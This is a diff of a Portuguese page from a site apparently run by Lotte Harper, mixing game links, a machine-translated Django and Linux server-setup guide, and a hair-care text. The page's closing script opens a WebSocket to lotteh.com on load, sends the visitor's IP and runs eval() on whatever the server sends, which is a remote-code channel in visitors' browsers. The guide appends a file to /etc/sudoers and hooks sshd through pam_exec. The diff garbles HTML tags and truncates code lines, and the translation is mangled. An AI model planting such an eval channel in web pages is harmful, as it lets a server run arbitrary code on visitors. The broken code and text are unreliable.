@@ -140,11 +140,12 @@
 
 
 <div id="0" style="white-space: pre-wrap;">Três treze - jogo de cartas online
-Jogue três treze com um amigo clicando no link abaixo para gerar um código de convite ou participar de um jogo.<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">Convite com código</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Junte -se ao jogo</a>
-<script src="/static/games/threethirteen.js"></script>***</div>
+Jogue três treze com um amigo clicando no link abaixo para gerar um código de convite ou participar de um jogo.<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">Convite com código</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">lotteh.com/games/</a>"Title =" Participe de um jogo "&gt; Junte -se ao jogo
+<script src="/static/games/threethirteen.js"></script>
+</div>
 
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" id="img0" alt="Comprar em"/><p>por Daisy / <a href="/pt/three-thirteen---online-card" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
+<div><img width="100%" height="auto" src="https://i.imgur.com/8I5qWNu.png" id="img0" alt="Comprar em"/><p>por Daisy / <a href="/pt/three-thirteen---online-card" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -163,7 +164,17 @@ Jogue três treze com um amigo clicando no link abaixo para gerar um código de 
 
 <hr></div>
 
-<div id="1" style="white-space: pre-wrap;">Aprendizado e segurança profundos e baseados na Web por exemplo
+<div id="1" style="white-space: pre-wrap;">Jogue color sudoku online - jogo de Colordoku grátis
+Este é um jogo gratuito para jogar color sudoku (Colordoku).<canvas class="game" id="game197"></canvas>
+<script src="/static/js/createjs.min.js"></script>
+<script src="/static/games/colordokugames.js"></script>
+<script src="/static/games/colordoku.js"></script>
+</div>
+
+<div><p>por Daisy / <a href="/pt/play-color-sudoku-online---free" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
+</div>
+
+<div id="2" style="white-space: pre-wrap;">Aprendizado e segurança profundos e baseados na Web por exemplo
 Terceira edição
 Charlotte Harper
 3 de julho de 2024
@@ -907,7 +918,7 @@ nano users/views.py
             send_verification_email(user)
 # … (Antes) redirecionar (
 </code></pre>Você não precisa adicionar a primeira e a última linhas nesse trecho de código, apenas verifique se a visualização do registro envia o email de verificação para o usuário. Deve ser assim:<pre class="language-python"><code>
-# … Importações
+# ... valores
 from .forms import UserRegisterForm
 
 def register(request):
@@ -972,7 +983,7 @@ def sendwelcomeemail(user):
 Então, o que vem a seguir? Nós percorremos um longo caminho. Realmente, devemos estar prontos para implantar o site em um servidor. Podemos adicionar o Decorador @Login_Required e tornar nossas visualizações seguras, receber inscrições de usuário, enviar e -mail compatível e informações de cache, que é a base do que um site precisa fazer para permanecer relevante. Adicionaremos mais alguns recursos úteis e, em seguida, criaremos uma base para implantar nosso código em um servidor remoto, configurar um servidor de email, configuração de domínio e filtros para tornar nosso site seguro e apropriado.
 
 Também precisaremos de uma visualização de redefinição de senha, então vamos adicionar isso muito rápido. A exibição de redefinição de senha incorporada do Django é quebrada em algumas funções, mas veremos como escrever nossa própria visualização, modelo de e -mail, formulários e padrões de URL. Aqui está a aparência da visão, em usuários/visualizações.py<pre class="language-python"><code>
-# ... importações
+# ... valores
 from django.contrib.auth.tokens import default_token_generator
 from django.contrib.auth.forms import SetPasswordForm
 from django.utils.http import urlsafe_base64_decode
@@ -1127,7 +1138,7 @@ python manage.py makemigrations &amp;&amp; python manage.py migrate
 </code></pre>Isso é importante porque toda vez que fazemos alterações nos modelos, precisaremos criar as tabelas e atualizar o banco de dados com padrões antes que possamos realmente usar os modelos.
 
 Em seguida, vamos improvisar nossa exibição de login para redirecionar para uma visualização de autenticação secundária. Em Usuários/Views.py, remova a função de login e redirecione para a URL que acabamos de gerar nos modelos de usuário.<pre class="language-python"><code>
-# … Importações
+# ... valores
 
 def login(request):
     if request.method == “POST”:
@@ -1379,7 +1390,7 @@ nano users/templates/users/mfa_onboarding.html
 Isso parece muito bom! Enquanto tudo estiver configurado corretamente, devemos enviar mensagens e registrar o usuário com o número de telefone deles assim que adicionarmos os padrões de URL. A última coisa que precisamos configurar é uma visualização de perfil para que possamos garantir que o usuário possa alterar o número de telefone sem estar conectado. "Pare" para optar por não ter mensagens de texto futuras.
 
 Vamos adicionar uma visualização de perfil aos usuários/views.py. Essa visualização atualizará a biografia, o email, o nome de usuário e o número de telefone do usuário, além de permitir -nos ativar a autenticação de vários fatores. Primeiro, precisaremos de mais duas formas em usuários/forms.py<pre class="language-python"><code>
-# ... importações
+# ... valores
 class UserUpdateForm(forms.ModelForm):
     email = forms.EmailField()
     class Meta:
@@ -1971,7 +1982,7 @@ nano sshd_config
 
 # Autenticação:
 
-# LogingRacetime 2M
+# LogringRacetime 2M
 # Permitrootlogina Proibit-Password
 # Strictmodes sim
 # Maxauthtries 6
@@ -2050,7 +2061,7 @@ PrintMotd no
 # Nenhum caminho de banner padrão
 Banner /etc/banner
 
-# Permitir que o cliente passe as variáveis ​​de ambiente do local
+# Permitir que o cliente passe variáveis ​​locais variáveis
 AcceptEnv LANG LC_*
 
 # substituir a inadimplência de não subsistemas
@@ -2102,7 +2113,7 @@ sudo nano /usr/bin/ascript
 # !
 if [ ! -f /usr/bin/$1 ]; then
     sudo touch /usr/bin/$1
-    echo "# !/bin/bash "&gt;&gt;/usr/bin/$ 1
+    echo "# !
     sudo chmod a+x /usr/bin/$1
     sudo nano /usr/bin/$1
     echo $1 | sudo tee -a /etc/ascripts
@@ -2113,7 +2124,7 @@ fi
 </code></pre>Lembre -se de que este script leva um argumento, o nome do script, como US $ 1. Primeiro, ele verifica se o arquivo existe ou o cria, adiciona a primeira linha a declarar que o script é bash, altera suas permissões, edita -o e adiciona seu nome a /etc /ANDRACTS que nos permite armazenar os nomes dos scripts que nós estão criando. Se o arquivo já existir, basta alterar as permissões e editá -lo. Salve o arquivo e, em seguida, alteraremos suas permissões. Enquanto usamos esse script, não teremos que fazer isso novamente.<pre class="language-bash"><code>
 sudo chmod a+x /usr/bin/ascript
 </code></pre>Perfeito. Agora vamos criar um script chamado Configuração. Primeiro, para não sobrecarregá -lo, mas dê uma olhada na aparência do meu script de configuração. Vamos percorrer como esse script deve ser em seu projeto, você não precisará de tudo no meu script para começar.<pre class="language-bash"><code>
-# !
+# !/bin/bash
 SECONDS=0
 PYTHON_VERSION=3.12
 echo "femmebabe installer initialized."
@@ -2364,7 +2375,7 @@ sudo chmod -R g+rwX ./
 sudo chmod -R g+rX .././
 sudo chmod -R g-rwX ../.ssh
 sudo chmod 774 ./
-# Sudo chmod 664 db.sqlite3
+# sudo chmod 664 db.sqlite3
 # sudo chown www-data: usuários db.sqlite3
 sudo chown -R www-data:www-data media/
 sudo chown www-data:users ./
@@ -2398,7 +2409,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # Injete Config Pam e remova a configuração SSH com defeito
-# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
+# Sudo sed -i '' -e $ d '/etc/pam.d/sshd
 # Sudo sed -i '' -e $ d ' /etc /perfil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2843,7 +2854,7 @@ nano config/etc_postfix_main.cf
 
 # Debian específico: especificar um nome de arquivo causará o primeiro
 # linha desse arquivo a ser usada como nome.  O padrão do Debian
-# É /etc /mailname.
+# é /etc /mailname.
 # Myorigin = /etc /MailName
 
 smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
@@ -2914,7 +2925,7 @@ smtp      inet  n       -       y       -       -       smtpd
 # SMTP INET N - Y - 1 Post -Screen
 # SMTPD PASS - - Y - - SMTPD
 # Dnsblog Unix - - y - 0 dnsblog
-# tlsproxy Unix - - y - 0 tlsproxy
+# Tlsproxy Unix - - y - 0 tlsproxy
 # Escolha um: Ative o envio apenas para clientes de loopback ou para qualquer cliente.
 # 127.0.0.1:Submission INET N - Y - - SMTPD
 submission inet n       -       y       -       -       smtpd
@@ -2934,7 +2945,7 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restictions = $ mua_client_restictions
 # -o smtpd_helo_restictions = $ mua_helo_restictions
 # -o smtpd_sender_restictions = $ mua_sender_restictions
-# -o smtpd_recipient_restictions =
+# -o smtpd_recipient_trival =
 # -o smtpd_relay_restictions = permit_sasl_authenticated, rejeite
 #   -o milter_macro_daemon_name=ORIGINATING
 # Escolha um: Ative SMTPs apenas para clientes de loopback ou para qualquer cliente.
@@ -2947,14 +2958,14 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restictions = $ mua_client_restictions
 # -o smtpd_helo_restictions = $ mua_helo_restictions
 # -o smtpd_sender_restictions = $ mua_sender_restictions
-# -o smtpd_recipient_restictions =
+# -o smtpd_recipient_trival =
 # -o smtpd_relay_restictions = permit_sasl_authenticated, rejeite
 #   -o milter_macro_daemon_name=ORIGINATING
 # 628 INET N - Y - - QMQPD
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
-# Qmgr unix n - n 300 1 oqmgr
+# qmgr unix n - n 300 1 oqmg
 tlsmgr    unix  -       -       y       1000?   1       tlsmgr
 rewrite   unix  -       -       y       -       -       trivial-rewrite
 bounce    unix  -       -       y       -       0       bounce
@@ -3052,7 +3063,7 @@ nano config/etc_default_opendkim
 # Daemon_Opts = ""
 # Alterar para/var/spool/postfix/run/opendkim para usar um soquete UNIX com
 # Postfix em um chroot:
-# Redondir =/var/spool/postfix/run/opendkim
+# RúnDir =/var/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # Descomamento para especificar um soquete alternativo
@@ -3398,7 +3409,7 @@ nano config/etc_default_opendkim
 # Daemon_Opts = ""
 # Alterar para/var/spool/postfix/run/opendkim para usar um soquete UNIX com
 # Postfix em um chroot:
-# Rúndir =/was/spool/pósfix/run/opendkim
+# RúnDir =/var/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # Descomamento para especificar um soquete alternativo
@@ -3572,23 +3583,14 @@ Obrigado por reservar um tempo para ler este Guia de Desenvolvimento da Web da T
 <div><p>por Daisy / <a href="/pt/practical-web-based-deep" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
 </div>
 
-<div id="2" style="white-space: pre-wrap;">Dois jogadores cor sudoku online grátis
+<div id="3" style="white-space: pre-wrap;">Dois jogadores cor sudoku online grátis
 Jogue colaborativo colaborativo sudoku com um amigo de graça.<a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">Convide um amigo</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Participe de um jogo</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
-
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img2" alt="Comprar em"/><p>por Daisy / <a href="/pt/two-player-color-sudoku-online" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
 </div>
 
-<div id="3" style="white-space: pre-wrap;">Jogue color sudoku online - jogo de Colordoku grátis
-Este é um jogo gratuito para jogar color sudoku (Colordoku).
-***<canvas class="game" id="game197"></canvas>
-<script src="/static/js/createjs.min.js"></script>
-<script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
-
-<div><p>por Daisy / <a href="/pt/play-color-sudoku-online---free" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
+<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img3" alt="Comprar em"/><p>por Daisy / <a href="/pt/two-player-color-sudoku-online" title="Ver postagem">Visualizar</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="Comprar em Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="Comprar com criptomoeda em Lotte Harper">Compre com criptomoeda</a></p><hr>
 </div>
 
 <div id="4" style="white-space: pre-wrap;"><p>Como uso um impasse?</p><p><br/></p><p>1. Comece cultivando o cabelo para o comprimento desejado. Seu cabelo deve ter pelo menos 2-3 polegadas de comprimento para obter os melhores resultados.</p><p><br/></p><p>2. Seque o cabelo em peças pequenas e uniformes usando um pente. O tamanho das seções determinará o tamanho dos seus dreadlocks; portanto, escolha um tamanho com o qual se sinta confortável.</p><p><br/></p><p>3. Comece a recuar cada seção do cabelo torcendo e puxando -o firmemente em direção às raízes. Isso criará nós no cabelo, que acabará se formando em dreadlocks.</p><p><br/></p><p>4. Aplique cera ou gel a cada seção do cabelo para ajudar a segurar os nós no lugar e incentivar o cabelo a se unir.</p><p><br/></p><p>5. Continue voltando e torcendo cada seção de cabelo até que você tenha completado toda a sua cabeça. Esse processo pode demorar muito, portanto, seja paciente e faça pausas conforme necessário.</p><p><br/></p><p>6. Depois que todo o seu cabelo tiver sido torcido e recuado, deixe -o descansar por alguns dias para permitir que os nós apertem e se formem em dreadlocks.</p><p><br/></p><p>7. Depois de alguns dias, você pode começar a estilizar e manter seus dreadlocks lavando-os com shampoo sem resíduos e usando um gancho de crochê para ajudar a apertar os nós soltos.</p><p><br/></p><p>8. Para manter seus dreadlocks parecendo arrumados e arrumados, considere usar um lenço ou bandana para cobri -los ao dormir ou em ambientes sujos. A manutenção e manutenção regulares ajudarão seus dreadlocks a permanecer saudáveis ​​e vibrantes.</p></div>
@@ -3769,9 +3771,9 @@ Este é um jogo gratuito para jogar color sudoku (Colordoku).
 </div>
 <div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
 <div class="mb-2" style="display: flex; justify-content: space-around;">
-<a title="Compartilhe no Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fpt%2Fnews%3F&quote=Visit%20this%20link%20on%20Glam%20Girl%20X&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
+<a title="Compartilhe no Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fpt%2Fnews%3F&quote=Three%20Thirteen%20-%20Online%20Card%20Game&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
   <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
-<a title="Compartilhe no Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Visit%20this%20link%20on%20Glam%20Girl%20X%20-&url=https://glamgirlx.com/pt/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
+<a title="Compartilhe no Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Three%20Thirteen%20-%20Online%20Card%20Game%20-&url=https://glamgirlx.com/pt/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
   <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334q.002-.211-.006-.422A6.7 6.7 0 0 0 16 3.542a6.7 6.7 0 0 1-1.889.518 3.3 3.3 0 0 0 1.447-1.817 6.5 6.5 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.32 9.32 0 0 1-6.767-3.429 3.29 3.29 0 0 0 1.018 4.382A3.3 3.3 0 0 1 .64 6.575v.045a3.29 3.29 0 0 0 2.632 3.218 3.2 3.2 0 0 1-.865.115 3 3 0 0 1-.614-.057 3.28 3.28 0 0 0 3.067 2.277A6.6 6.6 0 0 1 .78 13.58a6 6 0 0 1-.78-.045A9.34 9.34 0 0 0 5.026 15"/>
 </svg></a>
 <a title="Compartilhe no Pinterest" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/pt/news?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
@@ -3783,7 +3785,7 @@ Este é um jogo gratuito para jogar color sudoku (Colordoku).
 </div>
 <div class="mb-2" style="display: flex; justify-content: space-around;">
 <a title="Compartilhe no Tumblr" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/pt/news?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></img></a>
-<a title="Compartilhe no Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/pt/news?&title=Visit%20this%20link%20on%20Glam%20Girl%20X"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
+<a title="Compartilhe no Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/pt/news?&title=Three%20Thirteen%20-%20Online%20Card%20Game"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
   <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
   <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
 </svg></a>
@@ -3885,32 +3887,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
